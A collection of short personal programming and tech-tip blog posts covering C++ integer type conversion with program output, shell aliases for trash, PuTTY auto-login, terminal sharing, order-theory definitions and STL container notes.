category: 
tags: []
---
{% include JB/setup %}
The following snippet's used to suppress the warning:unused-result etc.

```
template<typename T>
void inline UNUSED(const T&){} 
```

It works in c++.
---
layout: post
title: "autoConnectSYSU using Tasker"
description: ""
category: 
tags: []
---
{% include JB/setup %}
#How to auto connect to a wifi that needs login manually?
1. Use Tasker to detect whether or not connect to that specific wifi
2. Use RESTask(RESTful APIs) to do a Http Post to automate that thing.
---
layout: post
title: "Things Inside Conversion Bewteen Types"
description: ""
category: 
tags: []
---

#Things inside conversion of different types
What happens when converting variables between different types? (C++)


#Program to find the truth

```
#include<iostream>
using namespace std;

//
typedef unsigned char byte;
typedef signed char sbyte;
typedef unsigned int dword;
typedef signed int sdword;
//

enum MyType{TYPE_UNKNOW,TYPE_BYTE,TYPE_SBYTE,TYPE_DWORD,TYPE_SDWORD};
template<class T>
MyType getType(const T t){return TYPE_UNKNOW;}
MyType getType(const dword t){return TYPE_DWORD;}
MyType getType(const sdword t){return TYPE_SDWORD;}
MyType getType(const byte t){return TYPE_BYTE;}
MyType getType(const sbyte t){return TYPE_SBYTE;}

template <class T>
const char *getTypeName(const T t){
	switch(getType(t)){
		default:
		case TYPE_UNKNOW:
			return "Unknow";
		case TYPE_BYTE:
			return "Unsigned Byte";
		case TYPE_SBYTE:
			return "Signed Byte\t";
		case TYPE_DWORD:
			return "Unsigned Double Word";
		case TYPE_SDWORD:
			return "Signed Double Word";
	};
}
template<class T>
bool getByte(const T b,int i){
	unsigned long k=1;
	k<<=i;
	return (b&k)==k;
	//return ((b>>i)&0x1)==0x1;
}
//
template <class T>
inline void _printB(const T t,int numBits){
	//like a memory [high ... low]
	//print from high address bits, to low address bits.
	for(int i=numBits-1;i>=0;i--){
		cout<<getByte(t,i);
	}
}

template <class T>
inline void printB(const T t,int numBits=-1){
	if(numBits==-1){
		if(getType(t)==TYPE_BYTE||getType(t)==TYPE_SBYTE){
			numBits=8;
		}else{
			numBits=32;
		}
	}
	_printB(t,numBits);
}

template<class T>
void printT(const T t){
	if(getType(t)==TYPE_BYTE||getType(t)==TYPE_SBYTE){
		cout<<(int)t;
	}else{
		cout<<t;
	}
}
//
template<class T>
void testType(T t){
#define print(m) cout<<#m"\t";printT(m);cout<<"\t";printB(m);cout<<endl;
	byte b=t;
	sbyte sb=t;
	dword dw=t;
	sdword sdw=t;
#define ToWhat(v) cout<<"To "<<getTypeName(v)<<"\t";print(v);
	ToWhat(b);
	ToWhat(sb);
	ToWhat(dw);
	ToWhat(sdw);
	cout<<endl;
}
void testAllType(){
#define ShowTest(v,cmd) cmd;\
	cout<<"After run command:"#cmd""<<endl;\
	cout<<"From "<<getTypeName(v)<<"\t";print(v);\
	cout<<"---"<<endl;\
	testType(v);cout<<endl;

#define ShowTests(v)  \
	ShowTest(v,v=128);\
	ShowTest(v,v=127);\
	ShowTest(v,v++);\
	ShowTest(v,v++);\
	ShowTest(v,v=-1);\
	ShowTest(v,v--);\
	ShowTest(v,v=0xffffff00+64);\

	byte b;
	sbyte sb;
	dword dw;
	sdword sdw;
	//
	ShowTests(b);
	ShowTests(sb);
	ShowTests(dw);
	ShowTests(sdw);
	//
}
int main(){
	testAllType();
	return 0;
}
```


#The result of program.

```
After run command:b=128
From Unsigned Byte	b	128	10000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	128	00000000000000000000000010000000
To Signed Double Word	sdw	128	00000000000000000000000010000000


After run command:b=127
From Unsigned Byte	b	127	01111111
---
To Unsigned Byte	b	127	01111111
To Signed Byte		sb	127	01111111
To Unsigned Double Word	dw	127	00000000000000000000000001111111
To Signed Double Word	sdw	127	00000000000000000000000001111111


After run command:b++
From Unsigned Byte	b	128	10000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	128	00000000000000000000000010000000
To Signed Double Word	sdw	128	00000000000000000000000010000000


After run command:b++
From Unsigned Byte	b	129	10000001
---
To Unsigned Byte	b	129	10000001
To Signed Byte		sb	-127	10000001
To Unsigned Double Word	dw	129	00000000000000000000000010000001
To Signed Double Word	sdw	129	00000000000000000000000010000001


After run command:b=-1
From Unsigned Byte	b	255	11111111
---
To Unsigned Byte	b	255	11111111
To Signed Byte		sb	-1	11111111
To Unsigned Double Word	dw	255	00000000000000000000000011111111
To Signed Double Word	sdw	255	00000000000000000000000011111111


After run command:b--
From Unsigned Byte	b	254	11111110
---
To Unsigned Byte	b	254	11111110
To Signed Byte		sb	-2	11111110
To Unsigned Double Word	dw	254	00000000000000000000000011111110
To Signed Double Word	sdw	254	00000000000000000000000011111110


After run command:b=0xffffff00+64
From Unsigned Byte	b	64	01000000
---
To Unsigned Byte	b	64	01000000
To Signed Byte		sb	64	01000000
To Unsigned Double Word	dw	64	00000000000000000000000001000000
To Signed Double Word	sdw	64	00000000000000000000000001000000


After run command:sb=128
From Signed Byte		sb	-128	10000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	4294967168	11111111111111111111111110000000
To Signed Double Word	sdw	-128	11111111111111111111111110000000


After run command:sb=127
From Signed Byte		sb	127	01111111
---
To Unsigned Byte	b	127	01111111
To Signed Byte		sb	127	01111111
To Unsigned Double Word	dw	127	00000000000000000000000001111111
To Signed Double Word	sdw	127	00000000000000000000000001111111


After run command:sb++
From Signed Byte		sb	-128	10000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	4294967168	11111111111111111111111110000000
To Signed Double Word	sdw	-128	11111111111111111111111110000000


After run command:sb++
From Signed Byte		sb	-127	10000001
---
To Unsigned Byte	b	129	10000001
To Signed Byte		sb	-127	10000001
To Unsigned Double Word	dw	4294967169	11111111111111111111111110000001
To Signed Double Word	sdw	-127	11111111111111111111111110000001


After run command:sb=-1
From Signed Byte		sb	-1	11111111
---
To Unsigned Byte	b	255	11111111
To Signed Byte		sb	-1	11111111
To Unsigned Double Word	dw	4294967295	11111111111111111111111111111111
To Signed Double Word	sdw	-1	11111111111111111111111111111111


After run command:sb--
From Signed Byte		sb	-2	11111110
---
To Unsigned Byte	b	254	11111110
To Signed Byte		sb	-2	11111110
To Unsigned Double Word	dw	4294967294	11111111111111111111111111111110
To Signed Double Word	sdw	-2	11111111111111111111111111111110


After run command:sb=0xffffff00+64
From Signed Byte		sb	64	01000000
---
To Unsigned Byte	b	64	01000000
To Signed Byte		sb	64	01000000
To Unsigned Double Word	dw	64	00000000000000000000000001000000
To Signed Double Word	sdw	64	00000000000000000000000001000000


After run command:dw=128
From Unsigned Double Word	dw	128	00000000000000000000000010000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	128	00000000000000000000000010000000
To Signed Double Word	sdw	128	00000000000000000000000010000000


After run command:dw=127
From Unsigned Double Word	dw	127	00000000000000000000000001111111
---
To Unsigned Byte	b	127	01111111
To Signed Byte		sb	127	01111111
To Unsigned Double Word	dw	127	00000000000000000000000001111111
To Signed Double Word	sdw	127	00000000000000000000000001111111


After run command:dw++
From Unsigned Double Word	dw	128	00000000000000000000000010000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	128	00000000000000000000000010000000
To Signed Double Word	sdw	128	00000000000000000000000010000000


After run command:dw++
From Unsigned Double Word	dw	129	00000000000000000000000010000001
---
To Unsigned Byte	b	129	10000001
To Signed Byte		sb	-127	10000001
To Unsigned Double Word	dw	129	00000000000000000000000010000001
To Signed Double Word	sdw	129	00000000000000000000000010000001


After run command:dw=-1
From Unsigned Double Word	dw	4294967295	11111111111111111111111111111111
---
To Unsigned Byte	b	255	11111111
To Signed Byte		sb	-1	11111111
To Unsigned Double Word	dw	4294967295	11111111111111111111111111111111
To Signed Double Word	sdw	-1	11111111111111111111111111111111


After run command:dw--
From Unsigned Double Word	dw	4294967294	11111111111111111111111111111110
---
To Unsigned Byte	b	254	11111110
To Signed Byte		sb	-2	11111110
To Unsigned Double Word	dw	4294967294	11111111111111111111111111111110
To Signed Double Word	sdw	-2	11111111111111111111111111111110


After run command:dw=0xffffff00+64
From Unsigned Double Word	dw	4294967104	11111111111111111111111101000000
---
To Unsigned Byte	b	64	01000000
To Signed Byte		sb	64	01000000
To Unsigned Double Word	dw	4294967104	11111111111111111111111101000000
To Signed Double Word	sdw	-192	11111111111111111111111101000000


After run command:sdw=128
From Signed Double Word	sdw	128	00000000000000000000000010000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	128	00000000000000000000000010000000
To Signed Double Word	sdw	128	00000000000000000000000010000000


After run command:sdw=127
From Signed Double Word	sdw	127	00000000000000000000000001111111
---
To Unsigned Byte	b	127	01111111
To Signed Byte		sb	127	01111111
To Unsigned Double Word	dw	127	00000000000000000000000001111111
To Signed Double Word	sdw	127	00000000000000000000000001111111


After run command:sdw++
From Signed Double Word	sdw	128	00000000000000000000000010000000
---
To Unsigned Byte	b	128	10000000
To Signed Byte		sb	-128	10000000
To Unsigned Double Word	dw	128	00000000000000000000000010000000
To Signed Double Word	sdw	128	00000000000000000000000010000000


After run command:sdw++
From Signed Double Word	sdw	129	00000000000000000000000010000001
---
To Unsigned Byte	b	129	10000001
To Signed Byte		sb	-127	10000001
To Unsigned Double Word	dw	129	00000000000000000000000010000001
To Signed Double Word	sdw	129	00000000000000000000000010000001


After run command:sdw=-1
From Signed Double Word	sdw	-1	11111111111111111111111111111111
---
To Unsigned Byte	b	255	11111111
To Signed Byte		sb	-1	11111111
To Unsigned Double Word	dw	4294967295	11111111111111111111111111111111
To Signed Double Word	sdw	-1	11111111111111111111111111111111


After run command:sdw--
From Signed Double Word	sdw	-2	11111111111111111111111111111110
---
To Unsigned Byte	b	254	11111110
To Signed Byte		sb	-2	11111110
To Unsigned Double Word	dw	4294967294	11111111111111111111111111111110
To Signed Double Word	sdw	-2	11111111111111111111111111111110


After run command:sdw=0xffffff00+64
From Signed Double Word	sdw	-192	11111111111111111111111101000000
---
To Unsigned Byte	b	64	01000000
To Signed Byte		sb	64	01000000
To Unsigned Double Word	dw	4294967104	11111111111111111111111101000000
To Signed Double Word	sdw	-192	11111111111111111111111101000000


```




#Observation
1. When a signed varialbe Var is converted to a bigger-size variable NewVar, the new expanding high bits are filled with the same bit as the highest bit of Var, i.e. if Var is positive, NewVar is filled with 0, while if Var is negative, NewVar is filled with 1.

2. When a unsigned variable is converted to a bigger-size variable, the expanding bits are filled with 0.

3. When a variable is converted to a less-size variable, cut the high bits directly.


#Conclusion
In a nutshell, to expand a Var to a bigger size, fill with 0 if Var is a unsigned or Var is postive, otherwise 1.

---
layout: post
title: "Encoding Problems"
description: ""
category: 
tags: []
---

[EncodingProblem](https://github.com/ericlin1001/EncodingProblem)

---
layout: post
title: "三星A5000刷机"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# (Why)为什么我要刷机？

	1. 第一次刷机是因为手机用了一年多太卡了。
	2. 第二次，也即这次刷机是因为手机接收不了短信。

# (How)我是怎么刷机的？

	1. 确定我的手机型号，所需要备份的软件，和需要备份的手机资料，通讯录等。
		我手机型号为三星A5000, 用百度云备份了通讯录。

	2. 进行备份
		下载奇兔刷机，使用实用工具里的资料备份，把软件备份了一遍。
		这时想起上次用奇兔刷机，出了点问题，所以又下载了一个线刷宝。

	3. 开始刷机
		使用线刷宝，在里面下载好对应自己手机的ROM(ROM大概有1G多，要下比较久）, 开始自动刷机(刷机很快，10分钟左右)。

	4. 还原备份
		刷机完成，进入新系统，使用奇兔，进行还原软件, 还原成功。

	5. 测试解决问题否
		这次主要是手机收不了短信，刷机后，能成功收到短信了！
---
layout: post
title: "use Trash instead of Rm"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# Why use trash instead of rm ?

	If you wrongly rm sth, it can't recovered.
	While if you just move sth trash, it can be found if you delete accidently.

# How to use trash?

1. Install trash command.

	`sudo apt-get install trash`

2. Add following lines into ~/.bashrc.

	```
	alias trash="trash"
	alias del="trash"
	alias rm="echo Use 'del' to move to trash, or the full path i.e. '/bin/rm'"
	```

3. Let it take effect.

	`source .bashrc`

# Practice
1. How to delete sth?

	```
	touch foo
	del foo
	```

2. How to undelete sth?

	1. Find the file name that you want to restore.

		`trash-list`
	
	2. Go to /home/$username/.local/share/Trash/files and save your file.
		
# Notice

Never use rm, until you correctly know what it does.



---
layout: post
title: "SharingTerminal"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# [tmate](http://tmate.io)
---

### How to use it?

1. run `tmate`
2. run `tmate show-messages`
3. get the web url from the result of last command


# [screen](https://www.gnu.org/software/screen/)
---
[About how to remote working together on a terminal session in linux](http://technonstop.com/screen-commands-for-terminal-sharing).

### Teacher side

`screen -d -R hello`

### Students side

`screen -x hello`

# Others potential options
---
1. Open Broadcast Studio(obs)
	It's a software to capture and stream it to a RTMP(Real Time Message Protocol) server.

2. RMTP server(e.g. [MonaServer](https://sourceforge.net/projects/monaserver))
	A server to receive stream, and play it.

3. [doitlive](http://doitlive.readthedocs.io/en/latest/)

4. [asciinema](https://asciinema.org)
	a tool to record your terminal operation, and replay it if you wish.

---
layout: post
title: "Foot_Inch"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# Abbr.

	ft|foot||feet|英尺
	in|inch|inches|英寸
	cm|centimeter|centimeters|厘米

# Conversion

	```
	1ft=30.48cm
	1in=2.54cm
	1ft=12in

	1尺=30.3cm
	1寸=3.03cm
	1尺=10寸
	```
---
layout: post
title: "Putty_Auto_connect"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# How to make putty(windows) auto connect to your computer(linux)

1. Use [puttygen.exe](http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) to generate a public key and private key.
2. Save the public key in linux(~/.ssh/authorized_keys)
3. Inside Putty
	1. In *Connection->Auth->Private key file for authentication*, select the private key you saved.
	2. In *Connection Data*, set *the Auto-login username* as the linux's username.
	3. In *Session*, set the *Host Name*
	4. In *Save Session*s, save the session as **YourSession**
4. Create a shortcut to putty, and in its *property*, change the *target* as : "C:\Program Files\Putty\putty.exe" -load **YourSession**
5. Click the shortcut, and let it go!


---
layout: post
title: "SpellCheck"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# [Aspell](http://aspell.net/)
Aspell is a free spell check.

## How to use it?
aspell -c [file]

### For tex file
aspell -t -c [file]

---
layout: post
title: "Windows_How_to_restart_a_program"
description: ""
category: 
tags: []
---
{% include JB/setup %}

1. Save following code as **restart.bat**.
```
taskkill /F /IM  [process's name]
./start.vbs
```

2. Save following code as **start.vbs**, in the same directory.
```
Set ws = CreateObject("WScript.Shell")
ws.Run "[the full path of exe file]"
```

3. Just double click the **restart.bat**
---
layout: post
title: "markdown"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# Online markdown editor
[dillinger.io](dillinger.io)
---
layout: post
title: "NotesOfOrdering"
description: ""
category: 
tags: []
---
{% include JB/setup %}

# Basic explantion

1. Preorder
reflexive, transitive

2. Partial order(non-strict)
reflexive, antisymmetric, transitive.

2. Partial order(strict)
irreflexive, antisymmetric, transitive.

3. Total order
total, antisymmetric, transivtive

4. Strict weak orderings(strict partial order and transitivityOfIncomparability)
irreflexive, antisymmetric, transitivity, transitivityOfIncomparability

5. Well-order(total order and every non-empty subset of S has a leat element)
total, antisymmetric, transivtive, leastOfSubset


# Some definition
Suppose P is a set and R(<=) is a relation on P, then we have following definition, for all a, b, c in P:

1. reflexive: `a<=a `
2. antisymmetric: `if a<=b and b<=a then a=b(if a<=b and a!=b then b<=a must NOT hold)`
3. transitivity: `if a<=b and b<=c then a<=c`
4. totality: `a<=b or b<=a (it deduces reflexive)`

5. comparability(a, b): `a<b or a<b`
6. incomparability(a, b): `neither a<b nor b<a`
7. transitivityOfIncomparability: `for all a, b ,c, if incomparability(a,b) and incomparability(b,c), then incomparability(a,c)`
8. leastOfSubset: `for all non-empty subset A of S, there exits a least element is A`
9. irreflexive: `not a<=a`

# strict <==> non-strict
If <= if a non-strict partial order, then the corresponding non-strict partial order <= is the reflexive closure given by:

`a<b if a<=b and a!=b`

Conversely, strict ==> non-strict

`a<=b if a<b or a=b.`

# Reference
[Order theory](https://en.wikipedia.org/wiki/Order_theory)

[List of order theory topics](https://en.wikipedia.org/wiki/List_of_order_theory_topics)
---
layout: post
title: "prove O(log(a+b))=O(log(a)+log(b))"
---
To prove: $$\mathbf{O}(\log{(a+b)})=\mathbf{O}(\log{a}+\log{b})$$  
We need to have:  
$$k_1\log{(a+b)} \le \log{a}+\log{b} \le k_2\log{(a+b)}$$  
is equivalent to:  
$$ k_1\log{(a+b)} \le \log{(a*b)} \le k_2\log{(a+b)}$$  

Let e's exponent of both side, we have:  
$$(a+b)^{k_1} \le a*b \le (a+b)^{k_2}$$

Let $$k_1=1, A=1, B = 1$$, we know $$\forall{a>A}, \forall{b>B}$$ and  $$ (a+b) \le a*b$$ is always satisfied.

Let $$k_2=2, A=1, B = 1$$, we know $$\forall{a>A}, \forall{b>B}$$ $$a*b \le (a+b)^2 \Leftarrow \Rightarrow a*b \le a^2+2ab+b^2 \Leftarrow \Rightarrow   0 \le a^2+ab+b^2$$ is always satisfied.

---
layout: post
title: "test math equation"
---
This article is to test the math expression.

hello, this is a inline equation(`$$ a^2 + b^2 = c^2 $$`): $$ a^2 + b^2 = c^2 $$, end of the equation.

hello, this is a block equation(`\$$ a^2 + b^2 = c^2 $$`): \$$ a^2 + b^2 = c^2 $$, end of the equation.

This is a inline math(`\\( sin(x^2) \\)`) \\( sin(x^2) \\), end.
This is a math block equation(`\\[ sin(x^2) \\]`) \\[ sin(x^2) \\], end.

This is a block equation(`\$$ \mathsf{Data = PCs} \times \mathsf{Loadings} $$`):
\$$ \mathsf{Data = PCs} \times \mathsf{Loadings} $$

This is a inline equation(`$$ \mathbf{X}_{n,p} = \mathbf{A}_{n,k} \mathbf{B}_{k,p} $$`):
$$ \mathbf{X}_{n,p} = \mathbf{A}_{n,k} \mathbf{B}_{k,p} $$

---
layout: post
title: "STL container notes"
---

# Sequence container:
## array
Just like int a[], it's a simple wrapper of [];

## vector
### Modifier
push_back(),pop_back();
### Accesser
operator[],front(),back()

## deque
push_back(),pop_back();

## set
insert(), find(), erase();

# Non-sequence container:

## list
push_back(),pop_back();


## map
### Modifier
opertor[],insert(pair())
### Accesser
operator[],find()

# Adaptor

## stack
### Modifier
pop(), push();
### Accesser
top()

## priority_queue -> vector
### Modifier
pop(), push();
### Accesser
top()


## queue -> deque
### Modifier
push(),pop();
### Accesser
front(),back();


# Author: Eric Lin
